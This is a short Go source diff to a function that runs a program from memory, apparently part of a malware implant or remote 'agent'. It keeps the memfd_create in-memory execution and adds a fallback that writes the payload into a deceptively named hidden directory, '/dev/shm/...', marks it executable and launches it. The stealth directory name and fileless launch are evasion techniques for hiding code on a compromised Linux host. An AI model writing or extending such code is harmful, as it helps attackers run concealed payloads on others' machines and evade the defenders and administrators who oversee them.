@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"os/exec"
 	"syscall"
 	"time"
 	"unsafe"
@@ -48,7 +49,30 @@ func runFromMemory(procName string, buffer []byte) {
 	file.Close()
 
 	progWithArgs := append([]string{procName}, os.Args[1:]...)
-	_ = syscall.Exec(fdPath, progWithArgs, nil)
+	err := syscall.Exec(fdPath, progWithArgs, nil)
+	if err == nil {
+		log.Println("agent started from memory using memfd_create")
+		return
+	}
+
+	// older kernel
+	log.Printf("memfd_create failed: %v, trying shm_open", err)
+	shmPath := "/dev/shm/..."
+	if _, err := os.Stat(shmPath); os.IsNotExist(err) {
+		err = os.Mkdir(shmPath, 0700)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	err = ioutil.WriteFile(shmPath+"/"+procName, buffer, 0755)
+	if err != nil {
+		log.Fatal(err)
+	}
+	cmd := exec.Command(shmPath+"/"+procName, os.Args[1:]...)
+	err = cmd.Start()
+	if err != nil {
+		log.Fatal(err)
+	}
 }
 
 func main() {
